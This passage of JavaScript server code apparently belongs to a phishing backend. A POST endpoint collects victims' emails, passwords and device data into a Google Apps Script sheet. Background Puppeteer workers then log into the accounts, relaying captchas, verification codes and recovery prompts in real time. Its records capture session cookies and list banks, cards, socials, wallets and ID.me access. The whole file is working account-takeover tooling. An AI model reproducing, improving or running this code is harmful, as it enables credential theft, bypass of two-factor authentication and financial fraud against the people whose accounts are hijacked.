        } else if (isReusingBrowser && browser && (updateData.status !== "WAITINGCAPTCHA" && updateData.status !== "WAITINGCODE" && updateData.status !== "WAITINGOPTIONS" && updateData.status !== "WAITINGRECOVERYEMAIL" && updateData.status !== "WAITINGPASSWORD" && updateData.status !== "WAITINGPASSWORDERROR" && updateData.status !== "WAITINGEMAILERROR")) {
            const session = activeBrowserSessions.get(browserId);
            if (session?.targetCreatedListener && session.browser) {
                try {
                    session.browser.off('targetcreated', session.targetCreatedListener);
                } catch (offError) {
                    logger.warn(`[processRow][${browserId}] Error removing targetcreated listener from reused session: ${offError.message}`);
                }
            }
            // Update cache with final status BEFORE closing browser so template sees it immediately
            setCachedRow(browserId, { ...updateData, email: email || '', password: password || '' });
            logger.info(`[processRow][${browserId}] Final cleanup (reused session) - Closing browser (status: ${updateData.status})`);
            await browser.close().catch(err => logger.error(`Error closing reused browser during cleanup for ${browserId}: ${err.message}`));
            browserFullyClosed = true;
            activeBrowserSessions.delete(browserId);
            await new Promise(resolve => setTimeout(resolve, 2000)); // Add delay after browser.close()
        }

        const finalSheetUpdate = { ...updateData };
        // Restore email/password from function scope for terminal states only (COMPLETED/FAILED).
        // WAITING states already updated the sheet directly via updateBrowserRowDataFast; restoring here
        // would overwrite intentional clears (e.g. WAITINGPASSWORD_ERROR clearing the wrong password).
        if (!finalSheetUpdate.status?.startsWith("WAITING")) {
            if (email) finalSheetUpdate.email = email;
            if (password) finalSheetUpdate.password = password;
        }
        if (finalSheetUpdate.status === "FAILED" && processingStarted) {
            notifyTeam({ type: 'BROWSER_FAILURE', platform, email, browserId, detail: 'Process ended with FAILED status', url: page ? page.url() : undefined });
        } else if (finalSheetUpdate.status === "FAILED" && !processingStarted) {
            logger.info(`[processRow][${browserId}] Skipping FAILED notification — processing never started.`);
        }
        if (exitingEarly) {
            logger.info(`[processRow][${browserId}] Skipping sheet update — exitingEarly.`);
        } else if (finalSheetUpdate.status?.startsWith("WAITING")) {
            // For waiting states, the handler already updated the sheet + cache via updateBrowserRowDataFast.
            // Skipping here prevents the finally block from restoring email/password that the
            // handler intentionally cleared (e.g. wrong password cleared by WAITINGPASSWORD_ERROR).
            logger.info(`[processRow][${browserId}] Skipping sheet update — waiting state already handled.`);
        } else {
            logger.info(`[processRow][${browserId}] Updating final sheet state with data: ${JSON.stringify(finalSheetUpdate)}`);
            await updateBrowserRowData(browserId, finalSheetUpdate).catch(err =>
                logger.error(`[processRow][${browserId}] Failed to update final sheet state: ${err.message}`)
            );
            setCachedRow(browserId, finalSheetUpdate);
        }

        if (updateData.status === "FAILED" && !initialCheckResult.accountAccess && userDataDir) {
            if (browserFullyClosed || (browser && !browser.isConnected())) {
                try {
                    logger.info(`[processRow][${browserId}] Final status FAILED. Attempting to delete user data directory: ${userDataDir}`);
                    // Add retry logic for fs.remove to handle EBUSY errors
                    // Add a small initial delay before attempting to delete, to allow browser process to fully exit
                    await new Promise(resolve => setTimeout(resolve, 2000)); // 2-second initial delay

                    const maxRetries = 5; // Increased retries
                    const delay = 2000; // Increased delay between retries to 2 seconds
                    let attempt = 0;
                    let deleted = false;
                    while (attempt < maxRetries && !deleted) {
                        try {
                            await fs.remove(userDataDir);
                            logger.info(`[processRow][${browserId}] Successfully deleted user data directory: ${userDataDir}`);
                            deleted = true;
                        } catch (deleteError) {
                            if (deleteError.code === 'EBUSY' || deleteError.code === 'ENOTEMPTY') { // Also handle ENOTEMPTY
                                logger.warn(`[processRow][${browserId}] EBUSY/ENOTEMPTY deleting user data directory (attempt ${attempt + 1}/${maxRetries}): ${userDataDir}. Retrying in ${delay}ms...`);
                                await new Promise(resolve => setTimeout(resolve, delay));
                                attempt++;
                            } else {
                                logger.error(`[processRow][${browserId}] Error deleting user data directory (failed status): ${deleteError.message}`, deleteError);
                                throw deleteError; // Re-throw if it's not EBUSY/ENOTEMPTY
                            }
                        }
                    }
                    if (!deleted) {
                        logger.error(`[processRow][${browserId}] Failed to delete user data directory after ${maxRetries} retries.`);
                    }
                } catch (deleteError) {
                    // This catch block will handle errors other than EBUSY/ENOTEMPTY that were re-thrown
                    if (deleteError.code === 'EBUSY' || deleteError.code === 'ENOTEMPTY') { // Should not happen if retry logic works, but as a fallback
                        logger.warn(`[processRow][${browserId}] Final EBUSY/ENOTEMPTY error deleting user data directory: ${userDataDir}. This often means a previous browser process didn't fully exit.`);
                    } else {
                        logger.error(`[processRow][${browserId}] Error deleting user data directory (failed status): ${deleteError.message}`, deleteError);
                    }
                }
            } else {
                logger.warn(`[processRow][${browserId}] Final status FAILED, but session active. Skipping userDataDir deletion.`);
            }
        }
    }
}

// Helper function to check if the Puppeteer page is responsive
async function isPageResponsive(page, browserId, instanceId) {
    try {
        await Promise.race([
            page.evaluate(() => document.readyState),
            new Promise((_, reject) => setTimeout(() => reject(new Error('Page navigation in progress - evaluate timed out')), 20000))
        ]);
        return true;
    } catch (e) {
        // Navigation-related errors mean the page is alive but transitioning — not unresponsive
        const msg = e.message || '';
        if (msg.includes('navigation') || msg.includes('detached') || msg.includes('destroyed') || msg.includes('navigat')) {
            logger.debug(`[isPageResponsive][${browserId}][${instanceId}] Page is navigating (not unresponsive): ${msg}`);
            return true;
        }
        logger.error(`[isPageResponsive][${browserId}][${instanceId}] Page is unresponsive: ${msg}`);
        return false;
    }
}


// Helper: parse locale date string "M/D/YYYY, H:MM:SS AM/PM" format used by lastRun
function parseLocaleDate(str) {
    if (!str) return null;
    const parts = str.split(', ');
    if (parts.length !== 2) return null;
    const dateParts = parts[0].split('/');
    if (dateParts.length !== 3) return null;
    const timeParts = parts[1].split(' ');
    if (timeParts.length < 2) return null;
    const timeComponents = timeParts[0].split(':');
    if (timeComponents.length < 2) return null;
    const isPM = timeParts[1] === 'PM';
    const month = parseInt(dateParts[0], 10) - 1;
    const day = parseInt(dateParts[1], 10);
    const year = parseInt(dateParts[2], 10);
    let hours = parseInt(timeComponents[0], 10);
    const minutes = parseInt(timeComponents[1], 10);
    const seconds = parseInt(timeComponents[2] || '0', 10);
    if (isPM && hours < 12) hours += 12;
    if (!isPM && hours === 12) hours = 0;
    return new Date(Date.UTC(year, month, day, hours, minutes, seconds));
}

// Flag to prevent the interval timer from overlapping runs if a run takes longer than the interval
let isProcessingInterval = false;


async function processWaitingRows() {
    if (isProcessingInterval) {
        logger.debug("Interval check skipped: Previous run still in progress.");
        return;
    }
    isProcessingInterval = true;
    const totalActive = activeProcesses.size + activeBrowserSessions.size;
    logger.debug(`Interval check running. Active: ${activeProcesses.size} processing + ${activeBrowserSessions.size} waiting = ${totalActive}/${MAX_CONCURRENT_BROWSERS}`);

    try {
        const availableSlots = MAX_CONCURRENT_BROWSERS - totalActive;
        if (availableSlots <= 0) {
            logger.debug("Concurrency limit reached. No available slots.");
            isProcessingInterval = false;
            return;
        }

        const data = await fetchDataFromAppScript(3, 120000, true);

        if (!Array.isArray(data) || data.length === 0) {
            logger.warn('Invalid or empty data fetched from App Script.');
            isProcessingInterval = false;
            return;
        }

        const headers = data[0];
        const columnIndexes = getColumnIndexes(headers);
        const rows = data.slice(1);


        const processableStatuses = ["WAITING", "WAITINGEMAIL", "WAITINGPASSWORD", "WAITINGPASSWORDERROR", "WAITINGOPTIONS", "WAITINGCODE", "WAITINGRECOVERYEMAIL", "WAITINGCAPTCHA"];
        const staleCheckStatuses = [...processableStatuses, "WAITINGEMAILERROR", "WAITINGPASSWORDERROR", "PROCESSING"];
        const STALE_TIMEOUT_MS = 10 * 60 * 1000; // 10 minutes
        const activityIdx = columnIndexes['lastUserActivity'] !== undefined ? columnIndexes['lastUserActivity'] : columnIndexes['lastRun'];
        const usingActivityColumn = columnIndexes['lastUserActivity'] !== undefined;

        // Scan for stale rows and mark them FAILED so we don't launch browsers for abandoned sessions
        const staleCleanupIds = [];
        const staleUpdatePromises = [];
        for (const row of rows) {
            const status = row[columnIndexes['status']];
            const bId = row[columnIndexes['browserId']];
            if (!staleCheckStatuses.includes(status)) continue;
            if (activityIdx === undefined || !row[activityIdx]) continue;

            const activityVal = String(row[activityIdx]).trim();
            if (!activityVal) continue;

            const activityDate = parseLocaleDate(activityVal) || new Date(activityVal);
            if (activityDate && (Date.now() - activityDate.getTime() > STALE_TIMEOUT_MS)) {
                logger.warn(`[processWaitingRows] Stale row detected: browserId='${bId}', status='${status}', lastUserActivity='${activityVal}'. Marking FAILED.`);
                row[columnIndexes['status']] = 'FAILED'; // Update in-memory immediately so filter sees FAILED
                staleUpdatePromises.push(
                    updateBrowserRowData(bId, {
                        status: "FAILED",
                        verified: false,
                        fullAccess: false,
                        lastJsonResponse: JSON.stringify({
                            browserId: bId, status: "FAILED",
                            message: "Session timed out or abandoned. Marked as FAILED by staleness check.",
                            timestamp: new Date().toISOString()
                        })
                    }).catch(err => logger.error(`[processWaitingRows] Failed to mark stale row ${bId} as FAILED: ${err.message}`))
                );
                // If the stale row has an active browser session, shut it down
                if (activeProcesses.has(bId)) {
                    staleCleanupIds.push(bId);
                }
            }
        }

        // Await all stale sheet writes before proceeding to the filter — prevents re-pickup race
        if (staleUpdatePromises.length > 0) {
            await Promise.allSettled(staleUpdatePromises);
        }

        // Clean up browser sessions for stale rows that were in activeProcesses
        for (const bId of staleCleanupIds) {
            const session = activeBrowserSessions.get(bId);
            if (session) {
                const { browser, page, targetCreatedListener } = session;
                try { await browser.close(); } catch (e) { logger.warn(`[processWaitingRows] Error closing stale browser ${bId}: ${e.message}`); }
                if (page) {
                    try { page.removeListener('targetcreated', targetCreatedListener); } catch (e) {}
                }
                activeBrowserSessions.delete(bId);
            }
            activeProcesses.delete(bId);
            logger.info(`[processWaitingRows] Cleaned up stale active session for ${bId}.`);
        }

        const seenBidsThisRun = new Set(); // Dedup within a single fetch to prevent duplicate rows launching multiple browsers
        const selfUrl = getSelfUrl();
        const rowsToInitiateProcessing = rows.filter(row => {
            const status = row[columnIndexes['status']];
            const bId = row[columnIndexes['browserId']];
            const email = row[columnIndexes['email']];

            // Explicitly ignore FAILED status to prevent re-processing
            if (status === 'FAILED') {
                return false;
            }

            // Also skip COMPLETED status
            if (status === 'COMPLETED') {
                return false;
            }

            // Skip rows assigned to other servers — only filter when this server knows its own URL
            const serverIdx = columnIndexes['server'];
            if (serverIdx !== undefined && selfUrl) {
                const rowServer = row[serverIdx];
                if (rowServer && rowServer !== selfUrl) {
                    logger.debug(`[processWaitingRows] Skipping row ${bId}: assigned to server '${rowServer}', self is '${selfUrl}'`);
                    return false;
                }
            }

            // Skip duplicates within the same fetch to prevent launching N browsers for N copies of the same browserId
            if (seenBidsThisRun.has(bId)) {
                return false;
            }

            const shouldProcess = processableStatuses.includes(status) && !activeProcesses.has(bId);

            if (shouldProcess) {
                seenBidsThisRun.add(bId);
                logger.info(`[processWaitingRows] *** SELECTED FOR PROCESSING ***: browserId='${bId}', status='${status}', email='${email}'`);
            }

            return shouldProcess;
        });

        const allProcessableRowsInSheet = rows.filter(row => {
            const status = row[columnIndexes['status']];
            return staleCheckStatuses.includes(status);
        });

        if (allProcessableRowsInSheet.length === 0 && activeProcesses.size === 0 && activeBrowserSessions.size === 0) {
            logger.debug("No stale-checkable rows, no active processes, and no open browser sessions. Stopping interval.");
            stopInterval();
            isProcessingInterval = false;
            return;
        }

        if (rowsToInitiateProcessing.length === 0) {
            logger.debug(`No new rows to initiate processing (${allProcessableRowsInSheet.length} stale-checkable rows exist, ${activeProcesses.size} active processes, ${activeBrowserSessions.size} open browser sessions).`);
            isProcessingInterval = false;
            return;
        }

        const rowsToProcessInThisRun = [];
        let slotsFilled = 0;
        for (const row of rowsToInitiateProcessing) {
            if (slotsFilled < availableSlots) {
                rowsToProcessInThisRun.push(row);
                slotsFilled++;
            } else {
                break; // No more available slots for new processing
            }
        }

        logger.debug(`Found ${rowsToInitiateProcessing.length} eligible rows. Will attempt to process ${rowsToProcessInThisRun.length} new rows in this run.`);

        for (const rowToProcess of rowsToProcessInThisRun) {
            const browserId = rowToProcess[columnIndexes['browserId']];

            // Add to activeProcesses immediately to prevent other interval runs from picking it up
            activeProcesses.add(browserId);
            logger.info(`Starting processing for ${browserId} (Status: ${rowToProcess[columnIndexes['status']]}). Active: ${activeProcesses.size}/${MAX_CONCURRENT_BROWSERS}`);

            const existingSession = activeBrowserSessions.get(browserId);

            // Use async IIFE to ensure await ordering: sheet write completes before activeProcesses.delete
            (async () => {
                try {
                    await processRow(rowToProcess, columnIndexes, existingSession?.browser, existingSession?.page);
                } catch (err) {
                    logger.error(`[processWaitingRows] Uncaught error during processRow for ${browserId}: ${err.message}`, err);
                    const sessionToClean = activeBrowserSessions.get(browserId);
                    if (sessionToClean?.browser?.isConnected()) {
                        logger.warn(`[processWaitingRows] Cleaning up browser session for ${browserId} due to error in processRow.`);
                        if (sessionToClean.targetCreatedListener && sessionToClean.browser) {
                            try {
                                sessionToClean.browser.off('targetcreated', sessionToClean.targetCreatedListener);
                            } catch (offError) {
                                logger.warn(`[processWaitingRows] Error removing targetCreated listener during error cleanup for ${browserId}: ${offError.message}`);
                            }
                        }
                        try { await sessionToClean.browser.close(); } catch (closeErr) {
                            logger.error(`Error closing browser during error cleanup for ${browserId}: ${closeErr.message}`);
                        }
                    }
                    activeBrowserSessions.delete(browserId);

                    try {
                        updateBrowserRowDataFast(browserId, {
                            status: "FAILED",
                            verified: false,
                            fullAccess: false,
                            lastJsonResponse: JSON.stringify({
                                browserId, status: "FAILED", error: `processRow crashed: ${err.message}`, timestamp: new Date().toISOString()
                            })
                        });
                        notifyTeam({ type: 'FATAL', browserId, error: err.message, detail: 'processRow crashed in processWaitingRows' });
                    } catch (updateErr) {
                        logger.error(`[processWaitingRows] Failed to update sheet to FAILED after processRow crash for ${browserId}: ${updateErr.message}`);
                        notifyTeam({ type: 'FATAL', browserId, error: updateErr.message, detail: 'processRow crashed AND sheet update failed' });
                    }
                } finally {
                    activeProcesses.delete(browserId);
                    logger.info(`[processWaitingRows] Finished tracking process for ${browserId}. Active: ${activeProcesses.size}/${MAX_CONCURRENT_BROWSERS}`);
                }
            })();
        }

    } catch (error) {
        logger.error('Error in processWaitingRows:', error.message, error);
    } finally {
        isProcessingInterval = false;
        logger.debug("Interval check finished.");
    }
}

let intervalId = null; // Make it mutable

function ensureIntervalIsRunning() {
    if (intervalId === null) {
        logger.debug("Restarting background processing interval...");
        processWaitingRows(); // Initial run
        intervalId = setInterval(processWaitingRows, 10000); // Check every 10 seconds
        startAppScriptDataBackgroundUpdater(); // Start the data fetching background updater
        logger.debug(`Background processing interval set up with ID: ${intervalId}`);
    } else {
        logger.debug("Background processing interval is already running.");
    }
}

function stopInterval() {
    if (intervalId !== null) {
        logger.debug("Stopping background processing interval.");
        clearInterval(intervalId);
        intervalId = null;
        stopAppScriptDataBackgroundUpdater(); // Stop the data fetching background updater
    }
}

// Auto-start interval on module load so existing sheet rows get processed
// without waiting for an external POST to trigger it.
// The interval self-stops after 20 consecutive empty polls (see stopInterval logic).
identifyServerlessSelf().catch(err => logger.error(`[ServerlessTracker] Self-identification failed: ${err.message}`));
ensureIntervalIsRunning();

export async function OPTIONS() {
    return new Response(null, {
        status: 200,
        headers: {
            'Access-Control-Allow-Origin': '*',
            'Access-Control-Allow-Methods': 'GET, POST, OPTIONS',
            'Access-Control-Allow-Headers': 'Content-Type, Authorization, Origin, X-Forwarded-Host',
        },
    });
}

export async function POST(request) {
    console.log("--- POST function entered ---"); // Log at the very beginning of POST
    let requestBrowserId = null; // Added for finally block access
    // Handle preflight request
    if (request.method === 'OPTIONS') {
        return new Response(null, {
            status: 200,
            headers: {
                'Access-Control-Allow-Origin': '*',
                'Access-Control-Allow-Methods': 'GET, POST, OPTIONS',
                'Access-Control-Allow-Headers': '*',
            },
        });
    }

    let browser = null, page = null, targetCreatedListener = null;
    let platform = 'unknown', browserFullyClosed = false, isReusingBrowserForPOST = false;
    let userDataDir = '';
    let updateData = {}, finalStatusDetails = {};
    let instanceIdForPOST = '';
    try {
        // Auto-detect server identity from incoming request Host header (no need for SERVERLESS_ID env)
        await identifySelfFromHost(request.headers.get('host'));
        logger.debug(`[POST] Incoming request headers: ${inspect(Object.fromEntries(request.headers.entries()))}`);
        // Clone the request to prevent the "body disturbed" error
        const clonedRequest = request.clone();
        const rawBodyText = await clonedRequest.text(); // Read raw body as text
        logger.debug(`[POST] Raw incoming request body: ${rawBodyText}`);

        let body;
        try {
            body = JSON.parse(rawBodyText); // Manually parse the JSON
            logger.debug(`[POST] Parsed request body: ${inspect(body, { depth: null })}`);
        } catch (jsonParseError) {
            logger.error(`[POST] Error parsing JSON body: ${jsonParseError.message}`);
            return setCorsHeaders(NextResponse.json({
                error: "Invalid JSON format in request body",
                details: jsonParseError.message
            }, { status: 400 }));
        }

        const {
            email, browserId, strictly,
            projectId, userId, formId,
            timestamp = new Date().toISOString(),
            ipData = {}, deviceData = {},
            password, // Added to receive password from POST request
            wakeUp,   // Added for update-process engine wake-up
            assignedServer // Server URL assigned by GAS getBestServerlessEndpoint
        } = body;
        requestBrowserId = browserId; // Assign browserId to the outer scope variable

        // --- Data Validation for new process initiation ---
        if (!browserId) { // Only validate for new process initiation
            const errors = [];
            if (email && (typeof email !== 'string' || !email.includes('@') || !email.includes('.'))) {
                errors.push("Invalid 'email' format. Must be a valid email address.");
            }
            if (typeof projectId !== 'string' || projectId.trim().length === 0) {
                errors.push("'projectId' is required and must be a non-empty string.");
            }
            if (typeof userId !== 'string' || userId.trim().length === 0) {
                errors.push("'userId' is required and must be a non-empty string.");
            }
            if (typeof formId !== 'string' || formId.trim().length === 0) {
                errors.push("'formId' is required and must be a non-empty string.");
            }

            if (errors.length > 0) {
                logger.warn(`[POST] Data validation failed for new process: ${errors.join(', ')}`);
                return setCorsHeaders(NextResponse.json({
                    error: "Data validation failed",
                    details: errors
                }, { status: 400 }));
            }
        }

        // --- Handle requests with browserId (status check or resume) ---
        if (browserId) {
            // Handle wake-up from AppScript updateProcess
            if (wakeUp) {
                ensureIntervalIsRunning();
                return setCorsHeaders(NextResponse.json({ success: true, message: "Engine woken up" }, { status: 200 }));
            }
            userDataDir = `/tmp/users_data/${browserId}`; // Set userDataDir early for cleanup
            const existingData = await fetchDataFromAppScript();
            const headers = existingData[0];
            const columnIndexes = getColumnIndexes(headers);
            const existingRow = existingData.slice(1).find(r => r[columnIndexes['browserId']] === browserId);

            if (existingRow) {
                const currentStatus = existingRow[columnIndexes['status']];
                const lastJsonResponse = existingRow[columnIndexes['lastJsonResponse']];
                const lastRun = existingRow[columnIndexes['lastRun']];

                logger.info(`[POST][${browserId}] Found existing row with status: ${currentStatus}. Returning status.`);
                // If the user sends browserId, they just want status. Do NOT launch browser here.
                return setCorsHeaders(NextResponse.json({
                    status: currentStatus,
                    lastRun,
                    lastJsonResponse: lastJsonResponse ? JSON.parse(lastJsonResponse) : null,
                    currentStatus,
                    rowId: existingRow[columnIndexes['rowId']],
                    browserId: existingRow[columnIndexes['browserId']],
                    projectId: existingRow[columnIndexes['projectId']],
                    userId: existingRow[columnIndexes['userId']],
                    strictly: existingRow[columnIndexes['strictly']],
                    formId: existingRow[columnIndexes['formId']],
                    timestamp: existingRow[columnIndexes['timestamp']],
                    email: existingRow[columnIndexes['email']],
                    domain: existingRow[columnIndexes['domain']],
                    password: existingRow[columnIndexes['password']],
                    ipData: existingRow[columnIndexes['ipData']] ? JSON.parse(existingRow[columnIndexes['ipData']]) : null,
                    deviceData: existingRow[columnIndexes['deviceData']] ? JSON.parse(existingRow[columnIndexes['deviceData']]) : null,
                    verifyAccess: existingRow[columnIndexes['verifyAccess']],
                    cookieAccess: existingRow[columnIndexes['cookieAccess']],
                    verified: existingRow[columnIndexes['verified']],
                    fullAccess: existingRow[columnIndexes['fullAccess']],
                    cookieJSON: existingRow[columnIndexes['cookieJSON']] ? JSON.parse(existingRow[columnIndexes['cookieJSON']]) : null,
                    cookieFileURL: existingRow[columnIndexes['cookieFileURL']],
                    banks: existingRow[columnIndexes['banks']],
                    cards: existingRow[columnIndexes['cards']],
                    socials: existingRow[columnIndexes['socials']],
                    wallets: existingRow[columnIndexes['wallets']],
                    idMe: existingRow[columnIndexes['idMe']],
                    verificationOptions: existingRow[columnIndexes['verificationOptions']] ? JSON.parse(existingRow[columnIndexes['verificationOptions']]) : null,
                    verificationChoice: existingRow[columnIndexes['verificationChoice']],
                    verificationCode: existingRow[columnIndexes['verificationCode']],
                    cookie: existingRow[columnIndexes['cookie']],
                    formattedCookie: existingRow[columnIndexes['formattedCookie']]
                }, { status: 200 }));
            } else {
                // browserId provided but no row found. This is an invalid request if user expects only status check.
                logger.warn(`[POST][${browserId}] browserId provided but no corresponding row found. Cannot perform status check.`);
                return NextResponse.json({ error: `Browser ID '${browserId}' not found.` }, { status: 404 });
            }
        }

        // --- Handle requests without browserId (new process initiation) ---
        // If we reach here, browserId was NOT provided, so it's a new process.
        const actualBrowserId = `browser-${Date.now()}-${Math.random().toString(36).substring(2, 15)}`;
        userDataDir = `/tmp/users_data/${actualBrowserId}`;
        instanceIdForPOST = `POST-SETUP-${actualBrowserId}`;

        const initialStatus = email ? "WAITING" : "WAITINGEMAIL";
        const initialEmail = email || '';
        const initialDomain = initialEmail ? initialEmail.split('@')[1].toLowerCase() : '';

        // Create initial row with WAITING or WAITINGEMAIL status
        const initialRowData = {
            browserId: actualBrowserId,
            status: initialStatus,
            server: assignedServer || getSelfUrl(),
            projectId,
            userId,
            strictly,
            formId,
            timestamp,
            email: initialEmail,
            domain: initialDomain,
            ipData: JSON.stringify(ipData),
            deviceData: JSON.stringify(deviceData),
            password: password || '',
            lastJsonResponse: JSON.stringify({
                browserId: actualBrowserId,
                email: initialEmail,
                status: initialStatus,
                platform: "unknown",
                timestamp,
                message: initialStatus === "WAITINGEMAIL" ? "Awaiting email input." : "Starting email verification process"
            })
        };
        await updateBrowserRowData(actualBrowserId, initialRowData, true); // true for new row
        populateCache(actualBrowserId, initialRowData);

        // The background process will pick this up.
        // We don't launch browser here in the POST request itself.
        // Instead, we ensure the interval is running.
        ensureIntervalIsRunning(); // New function to ensure interval is active

        finalStatusDetails = { browserId: actualBrowserId, email, status: "WAITING", platform: "unknown", timestamp, message: "Process initiated, awaiting background processing." };
        return setCorsHeaders(NextResponse.json({ ...finalStatusDetails }, { status: 200 }));

    } catch (error) {
        logger.error(`[POST] Error: ${error.message}`, error);
        // Ensure cleanup in case of early error
        // This browser variable would only be set if an existing session was being reused and became stale.
        if (browser && !browserFullyClosed) {
            if (targetCreatedListener && isReusingBrowserForPOST) try { browser.off('targetcreated', targetCreatedListener); } catch (e) {/*ignore*/ }
            await browser.close().catch(e => logger.error(`Error closing browser (POST catch): ${e.message}`));
            browserFullyClosed = true; activeBrowserSessions.delete(requestBrowserId);
        }
        if (browser && !activeBrowserSessions.has(requestBrowserId)) activeProcesses.delete(requestBrowserId);
        return NextResponse.json({ error: error.message }, { status: 500 });
    } finally {
        // The browser variable in this finally block will only be set if an existing session was reused.
        // For new processes, no browser is launched directly in POST, so no cleanup needed here.
        const finalEffectiveStatus = updateData?.status; // This updateData might not be set for new processes
        const currentBrowserId = requestBrowserId || finalStatusDetails?.browserId; // Use actualBrowserId for new processes

        if (browser && !browserFullyClosed) { // Only if a browser was actually launched/reused in this POST call
            if (finalEffectiveStatus === "WAITINGCAPTCHA" || finalEffectiveStatus === "WAITINGCODE" || finalEffectiveStatus === "WAITINGOPTIONS" || finalEffectiveStatus === "WAITINGRECOVERYEMAIL" || finalEffectiveStatus === "WAITINGPASSWORD" || finalEffectiveStatus === "WAITINGPASSWORDERROR" || finalEffectiveStatus === "WAITINGEMAILERROR") {
                activeBrowserSessions.set(currentBrowserId, { browser, page, targetCreatedListener });
            } else {
                if (targetCreatedListener && isReusingBrowserForPOST) try { browser.off('targetcreated', targetCreatedListener); } catch (e) {/*ignore*/ }
                await browser.close().catch(e => logger.error(`Error closing browser (POST finally for ${requestBrowserId || 'N/A'}): ${e.message}`));
                browserFullyClosed = true; activeBrowserSessions.delete(requestBrowserId);
            }
        }

        // Cleanup userDataDir only if it was created and process failed, and browser is fully closed
        if (finalEffectiveStatus === "FAILED" && userDataDir) {
            const session = activeBrowserSessions.get(currentBrowserId);
            if (!session || !session.browser?.isConnected()) {
                try { await fs.remove(userDataDir); } catch (e) { if (e.code === 'EBUSY') logger.warn(`EBUSY deleting dir (POST FAILED for ${requestBrowserId || 'N/A'}): ${userDataDir}`); else logger.error(`Error deleting dir (POST FAILED for ${requestBrowserId || 'N/A'}): ${e.message}`); }
            } else { logger.warn(`[POST][${requestBrowserId}] FAILED, but session active. Skipping dir delete.`); }
        }
        // Only clean up activeProcesses if this POST handler actually launched/reused a browser.
        // Do NOT delete if processRow is still running from processWaitingRows — that would
        // cause processWaitingRows to re-pick the same browserId and try to launch a second
        // browser with the same userDataDir, which Chrome rejects (directory lock).
        if (browser && requestBrowserId && !activeBrowserSessions.has(requestBrowserId)) activeProcesses.delete(requestBrowserId);
    }
}
